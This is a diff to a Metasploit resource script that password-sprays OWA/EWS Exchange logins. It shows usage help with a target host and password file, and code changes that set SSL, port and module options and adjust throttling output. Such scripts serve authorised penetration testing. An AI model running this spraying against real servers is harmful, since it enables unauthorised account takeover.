@@ -6,17 +6,16 @@
       Before using the script, the creds datastore must already contain usernames that will be used as part of the attack.
 
     Usage:
-      ./msfconsole -r [rc_path] [rhost] [pass_file] [delay] [iterations]
+      spray_owa_ews_login.rc [rhost] [pass_file] [delay] [iterations]
 
     Arguments:
-      rc_path       - Full path to the RC script
       rhost         - The host that will be the target of the attack
       pass_file     - The path to a newline delimited file containing passwords
       delay         - The delay in seconds between each attack
       iterations    - The number of passwords to attempt per attack
 
 
-    Example of running:
+    Example:
       msf > resource spray_owa_ews_login.rc 192.168.1.23 /tmp/passwords.txt 3600 2
 
     Authors:
@@ -36,13 +35,15 @@
 
       run_single('use auxiliary/scanner/http/owa_ews_login')
       run_single("set RHOSTS #{host}")
+      run_single("set RPORT 443")
+      run_single("set SSL true")
       run_single('set DB_ALL_USERS true')
-      run_single('set ENUM_DOMAIN false')
+      run_single('set AUTODISCOVER false')
       run_single("set PASSWORD #{password}")
+      run_single("set VERBOSE false")
       run_single('run')
 
-      print_line
-      print_line("-----===[ #{Time.now.strftime('%d/%m/%Y %H:%M')} ]===-----")
+      print_line("-----===[ #{Time.now.strftime('%d/%m/%Y %H:%M:%S')} ]===-----")
       if count % iterations == 0
         sleep delay
       end
